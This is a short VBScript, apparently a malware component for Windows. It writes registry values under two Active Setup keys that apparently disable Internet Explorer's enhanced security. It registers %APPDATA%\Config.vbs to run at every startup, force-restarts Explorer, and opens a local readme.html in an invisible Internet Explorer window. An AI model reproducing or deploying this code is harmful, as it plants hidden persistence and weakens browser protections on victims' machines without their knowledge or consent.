Set ws = CreateObject("Wscript.Shell")
path="HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}\"
path1="HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}\"
path2="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\CONFIG"
ws.regwrite path & "IsInstalled","0","REG_DWORD"
ws.regwrite path1 & "IsInstalled","0","REG_DWORD"
ws.RegWrite path2,"%APPDATA%\Config.vbs" 
ws.run "taskkill /f /im explorer.exe",,1
ws.run "explorer.exe"
set ie=createobject("internetexplorer.application")
ie.navigate "file:///%APPDATA%/readme.html"
ie.visible=0
